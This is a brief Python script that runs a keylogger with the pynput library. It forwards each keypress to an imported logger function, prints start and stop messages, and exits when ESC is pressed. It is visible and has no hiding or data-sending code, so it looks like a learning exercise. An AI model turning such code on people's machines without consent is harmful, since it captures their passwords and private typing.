from pynput import keyboard
from logger import key_pressed

def on_press(key):
    # ESC cleanly stops the listener
    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping keylogger.")
        return False

    # Always call your logger
    key_pressed(key)

    # IMPORTANT: keep listener alive
    return True

def main():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()